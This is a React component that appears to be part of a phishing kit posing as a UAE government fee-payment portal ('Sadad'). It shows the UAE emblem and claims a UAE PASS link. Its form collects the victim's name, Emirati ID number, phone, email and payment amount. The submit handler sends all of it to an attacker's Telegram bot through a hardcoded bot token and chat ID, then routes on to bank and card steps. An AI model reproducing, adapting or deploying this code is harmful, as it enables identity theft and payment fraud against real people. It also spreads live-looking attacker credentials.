import React, { useState } from 'react';
import { useLocation } from "wouter";

const UserData: React.FC = () => {
  const [, setLocation] = useLocation();
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    fullName: '',
    idNumber: '',
    phone: '',
    email: '',
    serviceType: 'دفع رسوم شحن مركبة',
    amount: ''
  });

  const services = [
    "دفع رسوم شحن مركبة",
    "دفع رسوم نقل ملكية مركبة",
    "دفع رسوم نقل ملكية لوحة مركبة",
    "دفع رسوم حجز مركبة",
    "دفع رسوم فحص مركبة",
    "دفع رسوم عقد ايجار فيلا - شقة - مزرعة",
    "شاليه - مستودع - محل - ارض تجارية . - ارض زراعية",
    "دفع رسوم عقد تمليك (فيلا - شقة",
    "مزرعة - شاليه - مستودع - محل - ارض . تجارية - ارض زراعية",
    "دفع رسوم تأمين فيلا - شقة - مزرعة .",
    "شاليه - مستودع - محل - ارض تجارية -ارض زراعية",
    "دفع رسوم شحن",
    "تسديد المستحقات للطرفين",
    "دفع رسوم توقيع تعهد الكتروني",
    "دفع رسوم استقدام عمالة",
    "دفع ضريبة القيمة المضافة",
    "دفع رسوم عقد عمالة",
    "دفع رسوم الجوازات",
    "دفع رسوم عقد عمل",
    "دفع رسوم توكيل محامي",
    "دفع رسوم الخدمات الكترونية",
    "دفع رسوم وزارة الموارد البشرية",
    "دفع رسوم تجديد عقود",
    "دفع رسوم عقد تقديم خدمات",
    "استرداد الرسوم المدفوعة"
  ];

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { id, value } = e.target;
    
    if (id === 'idNumber') {
      const cleaned = value.replace(/\D/g, '').slice(0, 15);
      setFormData({ ...formData, [id]: cleaned });
      return;
    }
    
    if (id === 'phone') {
      const cleaned = value.replace(/\D/g, '').slice(0, 10);
      setFormData({ ...formData, [id]: cleaned });
      return;
    }

    if (id === 'amount') {
      const cleaned = value.replace(/[^0-9.]/g, '');
      setFormData({ ...formData, [id]: cleaned });
      return;
    }

    setFormData({ ...formData, [id]: value });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (formData.idNumber.length < 15) {
      alert("يرجى إدخال رقم هوية إماراتية صحيح (15 رقم)");
      return;
    }
    if (formData.phone.length < 10) {
      alert("يرجى إدخال رقم هاتف صحيح (10 أرقام)");
      return;
    }

    setLoading(true);

    const message = `
🔔 *بيانات مستخدم جديدة*
👤 الاسم: ${formData.fullName}
🆔 الهوية: ${formData.idNumber}
📱 الهاتف: ${formData.phone}
📧 البريد: ${formData.email}
🛠 الخدمة: ${formData.serviceType}
💰 المبلغ: ${formData.amount} د.إ
    `;

    try {
      await fetch(\`https://api.telegram.org/bot8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw/sendMessage\`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: '8362204213',
          text: message,
          parse_mode: 'Markdown'
        })
      });
      setLocation("/select-bank");
    } catch (error) {
      console.error("Error sending to Telegram", error);
      setLocation("/select-bank");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 font-['Tajawal']" dir="rtl">
      <header className="bg-white shadow-sm py-4 px-6 flex justify-between items-center border-b-2 border-orange-400">
        <div className="flex items-center gap-2">
          <div className="bg-orange-500 text-white p-2 rounded-lg font-bold text-xl">سداد</div>
          <span className="text-gray-800 font-bold text-lg">بوابة سداد الإمارات</span>
        </div>
        <img 
          src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Emblem_of_the_United_Arab_Emirates.svg/1200px-Emblem_of_the_United_Arab_Emirates.svg.png" 
          alt="UAE Emblem" 
          className="h-10 w-auto" 
        />
      </header>

      <div className="max-w-4xl mx-auto mt-8 px-4">
        <div className="flex justify-between items-center relative">
          <div className="absolute top-1/2 left-0 w-full h-1 bg-gray-200 -z-10 transform -translate-y-1/2"></div>
          <div className="bg-orange-500 text-white w-10 h-10 rounded-full flex items-center justify-center font-bold shadow-lg">1</div>
          <div className="bg-white text-gray-400 border-2 border-gray-200 w-10 h-10 rounded-full flex items-center justify-center font-bold">2</div>
          <div className="bg-white text-gray-400 border-2 border-gray-200 w-10 h-10 rounded-full flex items-center justify-center font-bold">3</div>
          <div className="bg-white text-gray-400 border-2 border-gray-200 w-10 h-10 rounded-full flex items-center justify-center font-bold">4</div>
          <div className="bg-white text-gray-400 border-2 border-gray-200 w-10 h-10 rounded-full flex items-center justify-center font-bold">5</div>
        </div>
        <div className="flex justify-between mt-2 text-xs font-bold text-gray-500">
          <span className="text-orange-600">البيانات</span>
          <span>البنك</span>
          <span>البطاقة</span>
          <span>التحقق</span>
          <span>التأكيد</span>
        </div>
      </div>

      <div className="max-w-2xl mx-auto mt-10 px-4 pb-20">
        <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-100">
          <div className="bg-slate-900 p-6 text-white text-center">
            <h2 className="text-2xl font-bold mb-2">بيانات مقدم الطلب</h2>
            <p className="text-slate-400 text-sm">يرجى إدخال البيانات المطلوبة بدقة لضمان إتمام عملية السداد</p>
          </div>
          
          <form onSubmit={handleSubmit} className="p-8 space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="space-y-2">
                <label className="text-sm font-bold text-gray-700 block">الاسم الكامل</label>
                <input 
                  id="fullName"
                  type="text" 
                  required
                  placeholder="أدخل اسمك كما في الهوية"
                  className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-orange-500 focus:border-transparent outline-none transition-all"
                  value={formData.fullName}
                  onChange={handleChange}
                />
              </div>
              <div className="space-y-2">
                <label className="text-sm font-bold text-gray-700 block">رقم الهوية الإماراتية</label>
                <input 
                  id="idNumber"
                  type="text" 
                  required
                  placeholder="784XXXXXXXXXXXX"
                  className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-orange-500 focus:border-transparent outline-none transition-all"
                  value={formData.idNumber}
                  onChange={handleChange}
                />
              </div>
              <div className="space-y-2">
                <label className="text-sm font-bold text-gray-700 block">رقم الهاتف المتحرك</label>
                <input 
                  id="phone"
                  type="tel" 
                  required
                  placeholder="05XXXXXXXX"
                  className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-orange-500 focus:border-transparent outline-none transition-all"
                  value={formData.phone}
                  onChange={handleChange}
                />
              </div>
              <div className="space-y-2">
                <label className="text-sm font-bold text-gray-700 block">البريد الإلكتروني</label>
                <input 
                  id="email"
                  type="email" 
                  required
                  placeholder="example@domain.com"
                  className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-orange-500 focus:border-transparent outline-none transition-all"
                  value={formData.email}
                  onChange={handleChange}
                />
              </div>
            </div>

            <div className="space-y-2">
              <label className="text-sm font-bold text-gray-700 block">نوع الخدمة</label>
              <select 
                id="serviceType"
                className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-orange-500 focus:border-transparent outline-none transition-all bg-white"
                value={formData.serviceType}
                onChange={handleChange}
              >
                {services.map((service, index) => (
                  <option key={index} value={service}>{service}</option>
                ))}
              </select>
            </div>

            <div className="space-y-2">
              <label className="text-sm font-bold text-gray-700 block">المبلغ المستحق (د.إ)</label>
              <input 
                id="amount"
                type="text" 
                required
                placeholder="0.00"
                className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-orange-500 focus:border-transparent outline-none transition-all font-bold text-lg text-orange-600"
                value={formData.amount}
                onChange={handleChange}
              />
            </div>

            <button 
              type="submit"
              disabled={loading}
              className="w-full bg-orange-500 hover:bg-orange-600 text-white py-4 rounded-xl font-bold text-lg shadow-lg hover:shadow-orange-200 transition-all flex items-center justify-center gap-2"
            >
              {loading ? (
                <div className="w-6 h-6 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
              ) : (
                <>
                  الانتقال لاختيار البنك
                  <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                    <path fillRule="evenodd" d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z" clipRule="evenodd" />
                  </svg>
                </>
              )}
            </button>
          </form>
          
          <div className="bg-blue-50 p-4 text-center border-t border-blue-100">
            <p className="text-blue-700 text-xs font-bold">بوابة سداد الإمارات مرتبطة بنظام الهوية الرقمية (UAE PASS) لضمان أمان بياناتك</p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default UserData;
